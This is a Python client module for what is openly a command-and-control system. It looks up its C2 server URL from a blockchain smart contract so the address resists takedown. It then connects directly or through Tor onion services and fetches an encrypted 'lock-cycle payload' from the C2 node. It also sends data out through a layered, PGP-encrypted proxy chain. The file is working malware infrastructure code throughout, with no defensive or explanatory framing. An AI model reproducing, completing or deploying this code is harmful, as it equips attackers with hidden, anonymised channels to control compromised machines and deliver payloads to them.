import sys
import os
import json
import socks
import socket
import time
import logging
from pathlib import Path
from typing import Dict, Any, Optional, Tuple
from urllib.parse import urlparse
import pgpy

import blockchain_utils

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from ghost_comm_lib.crypto.utils import generate_pgp_key, decrypt_pgp, decrypt_aes, encrypt_pgp
from ghost_comm_lib.network.client_connection import ClientConnection

_LOGGER = logging.getLogger(__name__)


def _candidate_contract_meta_paths() -> list[Path]:
    candidates = []

    env_path = os.environ.get("C2_CONTRACT_META")
    if env_path:
        candidates.append(Path(env_path).expanduser())

    module_dir = Path(__file__).resolve()
    candidates.append(module_dir.parent / "contract_meta.json")
    candidates.append(module_dir.parent.parent / "contract_meta.json")
    candidates.append(module_dir.parent.parent.parent / "contract_meta.json")

    blockchain_dir = Path(blockchain_utils.__file__).resolve().parent
    candidates.append(blockchain_dir / "contract_meta.json")

    unique: list[Path] = []
    seen = set()
    for candidate in candidates:
        try:
            resolved = candidate.resolve()
        except Exception:
            resolved = candidate
        if resolved in seen:
            continue
        seen.add(resolved)
        unique.append(resolved)
    return unique


def _load_contract_meta() -> Optional[Dict[str, Any]]:
    for path in _candidate_contract_meta_paths():
        if not path.is_file():
            continue
        try:
            with path.open("r", encoding="utf-8") as fh:
                meta = json.load(fh)
            _LOGGER.debug("Loaded contract metadata from %s", path)
            return meta
        except Exception as exc:
            _LOGGER.warning("Failed reading contract metadata at %s: %s", path, exc)
    return None


def _resolve_c2_url_via_blockchain() -> Optional[str]:
    meta = _load_contract_meta()
    if not meta:
        return None

    try:
        web3 = blockchain_utils.get_web3()
        contract = blockchain_utils.get_contract_instance(web3, meta["address"], meta["abi"])
        url = contract.functions.getC2Url().call()
        if url:
            _LOGGER.info("Retrieved C2 URL from blockchain: %s", url)
            return url
    except Exception as exc:
        _LOGGER.warning("Blockchain C2 lookup failed: %s", exc)
    return None


def _extract_host_port(endpoint: str, fallback_port: int) -> Tuple[str, int]:
    parsed = urlparse(endpoint)
    if parsed.scheme:
        host = parsed.hostname or parsed.path or endpoint
        if parsed.port:
            port = parsed.port
        elif parsed.scheme == "https":
            port = 443
        else:
            port = 80
    else:
        host = endpoint
        port = fallback_port

    return host, port

class Client:
    """Represents a client connecting to the network."""

    def __init__(self, name: str, email: str, primary_node_host: str = '127.0.0.1', primary_node_port: int = 8000, tor_socks_proxy_host: str = '127.0.0.1', tor_socks_proxy_port: int = 9050):
        """Initializes the Client."""
        self.priv_key, self.pub_key = generate_pgp_key(name, email)
        self.primary_node_host = primary_node_host
        self.primary_node_port = primary_node_port
        self.tor_socks_proxy_host = tor_socks_proxy_host
        self.tor_socks_proxy_port = tor_socks_proxy_port
        self.connection = None
        self.logger = logging.getLogger(f"{self.__class__.__module__}.{self.__class__.__name__}")

    def connect_to_primary_node(self):
        """Connects to the primary node. This connection might be direct or via Tor, depending on the primary_node_host."""
        resolved_url = _resolve_c2_url_via_blockchain()
        if resolved_url:
            if resolved_url != self.primary_node_host:
                self.logger.info("Switching primary node host to blockchain value: %s", resolved_url)
            target_endpoint = resolved_url
        else:
            self.logger.debug("Using configured primary node host: %s", self.primary_node_host)
            target_endpoint = self.primary_node_host

        host, port = _extract_host_port(target_endpoint, self.primary_node_port)
        self.primary_node_host = host
        self.primary_node_port = port

        use_tor = host.endswith(".onion")
        connection_port = 80 if use_tor else port
        self.connection = ClientConnection(
            host,
            connection_port,
            self.tor_socks_proxy_host if use_tor else None,
            self.tor_socks_proxy_port if use_tor else None
        )
        self.connection.connect()

    def request_lock_cycle_payload(self) -> dict:
        """Requests the lock-cycle payload from the primary node."""
        if not self.connection:
            raise Exception("Not connected to primary node.")

        request = {
            'type': 'get_payload',
            'pub_key': str(self.pub_key) # Convert PGPKey object to string (PEM format)
        }
        response = self.connection.send_data(json.dumps(request).encode('utf-8'))
        return self.decrypt_lock_cycle_payload(response)

    def decrypt_lock_cycle_payload(self, payload: bytes) -> dict:
        """Decrypts the lock-cycle payload received from the primary node."""
        payload_data = json.loads(payload.decode('utf-8'))
        encrypted_payload_aes = bytes.fromhex(payload_data['encrypted_payload'])
        encrypted_aes_key_pgp = bytes.fromhex(payload_data['encrypted_aes_key'])

        # Decrypt AES key with PGP
        aes_key = decrypt_pgp(encrypted_aes_key_pgp, self.priv_key)

        # Decrypt payload with AES
        decrypted_payload_bytes = decrypt_aes(encrypted_payload_aes, aes_key)
        return json.loads(decrypted_payload_bytes.decode('utf-8'))

    def _make_tor_request(self, onion_address: str, data: bytes) -> bytes:
        """Makes a request to an onion address via the Tor SOCKS proxy."""
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, self.tor_socks_proxy_host, self.tor_socks_proxy_port)
        sock.connect((onion_address, 80)) # Onion services typically listen on port 80

        # Send data
        sock.sendall(data)

        # Receive response
        response_bytes = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response_bytes += chunk
        sock.close()
        return response_bytes

    def send_data_through_distributed_proxy_chain(self, original_data: bytes, proxy_chain_config: Dict[str, Any], final_destination: str = None) -> bytes:
        """Sends data through the distributed proxy chain (onion routing style)."""
        node_order = proxy_chain_config["node_order"]
        node_configs = proxy_chain_config["node_configs"]

        current_encrypted_payload = original_data.hex() # Start with the original data, to be encrypted in layers

        # Build the onion: encrypt from inside out (last node to first node)
        # The innermost layer is the actual data for the last node.
        # Each subsequent layer wraps the previous one, encrypted for the current node.
        for i in reversed(range(len(node_order))):
            node_id = node_order[i]
            node_info = node_configs[node_id]
            node_pubkey_pem = node_info["pgp_pubkey"]
            node_onion_address = node_info["onion_address"]

            # Determine next hop information
            next_hop_onion = None
            next_hop_pubkey_pem = None
            current_final_destination = None

            if i < len(node_order) - 1: # If not the last node
                next_node_id = node_order[i+1]
                next_node_info = node_configs[next_node_id]
                next_hop_onion = next_node_info["onion_address"]
                next_hop_pubkey_pem = next_node_info["pgp_pubkey"]
            else: # This is the last node
                current_final_destination = final_destination

            # Prepare payload for the current node
            payload_for_node = {
                "original_data": current_encrypted_payload, # This is the data (or inner layer) for the current node to process
                "next_hop_onion": next_hop_onion,
                "next_hop_pubkey": next_hop_pubkey_pem,
                "final_destination": current_final_destination
            }
            
            # Encrypt the payload for the current node using its public key
            node_pubkey, _ = pgpy.PGPKey.from_blob(node_pubkey_pem.encode("utf-8"))
            current_encrypted_payload = encrypt_pgp(json.dumps(payload_for_node).encode("utf-8"), node_pubkey).hex()

        # Now, current_encrypted_payload holds the fully layered (onion) message.
        # Send this to the first node in the chain.
        first_node_id = node_order[0]
        first_node_info = node_configs[first_node_id]
        first_node_onion = first_node_info["onion_address"]

        print(f"Client: Sending layered data to first node: {first_node_onion}")
        response_from_chain = self._make_tor_request(first_node_onion, json.dumps({"encrypted_data": current_encrypted_payload}).encode("utf-8"))

        # The response from the chain will be the final processed data from the last node.
        # The last node returns a JSON with {"status": "final_processed", "data": processed_data.hex()}
        try:
            final_response = json.loads(response_from_chain.decode("utf-8"))
            if final_response.get("status") == "final_processed":
                print(f"Client: Received final processed data from chain.")
                return bytes.fromhex(final_response["data"])
            else:
                print(f"Client: Unexpected response from chain: {final_response}")
                return b"Error: Unexpected response from chain."
        except json.JSONDecodeError:
            print(f"Client: Failed to decode final response from chain: {response_from_chain}")
            return b"Error: Failed to decode final response."

    def close_connection(self):
        """Closes the connection to the primary node."""
        if self.connection:
            self.connection.close()
